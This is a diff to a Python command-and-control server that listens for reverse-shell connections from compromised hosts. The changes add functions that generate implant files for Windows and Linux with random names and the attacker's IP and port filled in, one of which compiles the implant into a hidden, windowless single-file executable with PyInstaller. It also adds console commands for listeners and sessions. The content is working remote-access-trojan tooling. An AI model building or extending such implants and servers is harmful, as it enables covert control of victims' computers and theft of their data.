@@ -1,7 +1,12 @@
-from prettytable import PrettyTable
 from datetime import datetime
+from prettytable import PrettyTable
 
+import os
+import random
+import shutil
 import socket
+import string
+import subprocess
 import sys
 import threading
 import time
@@ -83,7 +88,7 @@ def listener_handler():
     """
 
     # 1 Accept Connection
-    sock.bind((host_ip, host_port))
+    sock.bind((host_ip, int(host_port)))
     print('[+] Awaiting connection from client...')
     sock.listen()
     t1 = threading.Thread(target = comm_handler)
@@ -133,25 +138,141 @@ def comm_handler():
                 print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
         except:
             pass
+### PAYLOADS ###
+def winplant():
+
+    # generate random filename
+    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{rand_name}.py'
+    print(f'[+] Generating Windows payload file: {file_name}')
+
+    check_cwd = os.getcwd()
+    print(f'[+] Checking for {check_cwd}\\winplant.py')
+    # check if payload path exists on the system
+    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
+        # copy it to the newly generated file
+        shutil.copy('winplant.py', file_name)
+    else:
+        print(bcolors.WARNING + '[-] winplant.py file not found.')
+
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+
+    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
+        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
+    else:
+        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
+
+def unixplant():
+
+    # generate random filename
+    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{rand_name}.py'
+    print(f'[+] Generating Linux payload file: {file_name}')
+
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\unixplant.py') or os.path.exists(f'{check_cwd}/unixplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print(bcolors.WARNING + '[-] unixplant.py file not found.')
+
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
+        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
+    else:
+        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
+
+def exeplant():
+    # generate random filename
+    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{rand_name}.py'
+    exe_file = f'{rand_name}.exe'
+    print(f'[+] Generating exe payload file: {file_name}')
+
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print(bcolors.WARNING + '[-] winplant.py file not found.')
+
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+
+    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
+    # pyinstaller_exec = f'pyinstaller'
+    print(f'[+] Compiling executable {exe_file}...')
+    subprocess.call(pyinstaller_exec, shell=True, stderr=subprocess.DEVNULL)
+    os.remove(f'{rand_name}.spec')
+    shutil.rmtree('build')
+
+    if os.path.exists(f'{check_cwd}\\{exe_file}') or os.path.exists(f'{check_cwd}/{file_name}'):
+        print(bcolors.OKGREEN + f'[+] {exe_file} saved to current directory.' + bcolors.ENDC)
+    else:
+        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
 
 if __name__ == '__main__':
+    """ Main function. This is the entry
+        point into the program.
+    """
     banner()
     targets = []
     kill_flag = 0
+    listener_counter = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
-    except IndexError:
-        print('[-] Command line argument(s) missing. Please try again')
-        print('[-] Usage: python sockserver.py [host IP] [host Port]')
-    except Exception as e:
-        print(e)
-    listener_handler()
 
     while True:
         try:
-            command = input('[*] Enter command > ')
+            command = input('Enter command $ ')
+
+            if command == 'listeners -g':
+                host_ip = input('[+] Enter the IP to listen to: ')
+                host_port = input('[+] Enter the port to listen on: ')
+                listener_handler()
+                listener_counter += 1
+
+            if command == 'winplant py':
+                if listener_counter > 0:
+                    winplant()
+                else:
+                    print(bcolors.WARNING + '[-] You cannot generate a Windows payload without an active listener' + bcolors.ENDC)
+
+            if command == 'unixplant py':
+                if listener_counter > 0:
+                    unixplant()
+                else:
+                    print(bcolors.WARNING + '[-] You cannot generate a Linux payload without an active listener' + bcolors.ENDC)
+
+            if command == 'exeplant':
+                if listener_counter > 0:
+                    exeplant()
+                else:
+                    print(bcolors.WARNING + '[-] You cannot generate an exe payload without an active listener' + bcolors.ENDC)
+
             if command.split(" ")[0] == 'sessions':
                 session_counter = 0
 
